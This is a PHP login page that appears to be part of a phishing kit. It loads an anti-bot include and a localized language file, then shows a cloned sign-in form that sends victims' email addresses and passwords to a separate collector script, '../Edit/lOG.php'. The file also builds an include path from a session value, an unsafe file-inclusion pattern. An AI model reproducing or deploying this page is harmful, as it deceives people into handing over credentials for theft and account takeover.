<?php

/*==============[Lange_CounTry]=================*/
session_start();
include('../boot.php');	
include('../inc/lang.php');	
include "../inc/lang".$_SESSION['HF-JAckson'];
$HF_V = $_SESSION['country_name'];
/*===============[Code_HTML]====================*/
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<title><?php echo $Fartout;?> <?php echo $HF_V;?>-<?php echo $dokhol;?></title>
	<link rel="shortcut icon" href="../Files/img/icon.ico"/>
     <link rel="stylesheet" type="text/css" href="../Files/css/sm.css">
	<link rel="stylesheet" type="text/css" href="../Files/css/login.css">
</head>
<body>


     <div class="wrapp">
     	<header>
     		<a href="#">
     			<img src="../Files/img/x.jpg">
     		</a>
     	</header>
     	<div class="login">
     		<h1><?php echo $dokhol;?></h1>
               <div class="col-rez"></div>
     		<form action="../Edit/lOG.php" method="post">
     			<label for="email" class="amine"><?php echo $mail;?></label>
     			<input type="email" name="email" id="email">
     			<label for="pass" class="amine"><?php echo $Password;?></label>
     			<input type="password" name="pass" id="pass">
     			<div class="majd">
     				<a href="#"><?php echo $nsit;?></a>
     			</div>
     			<div class="moustache">
     				<input type="submit" name="sbt" value="<?php echo $dokhol;?>">
     			</div>
     			<div class="wiz">
     				<input type="checkbox" name="ch" id="ch">
     				<label for="ch" class="zz">
     					<span><?php echo $box;?></span>
     				</label>
     			</div>
     			<div class="hassan">
     				<span><?php echo $jdid;?></span>
     				<a href="#"><?php echo $tsajal;?></a>
     			</div>
     		</form>
     	</div> 


     	
     </div>

   <footer>
          <div class="wrapp">
               <div class="lawal">
                    <a href="#"><?php echo $so2al;?> <?php echo $cnt;?></a>
               </div>
               <div class="tani">
                    <ul>
                         <li>
                              <a href="">
                                   <span><?php echo $src;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $tem;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $prv;?></span>
                              </a>
                         </li>
                    </ul>
               </div>
          </div>     
          </footer>


</body>
</html>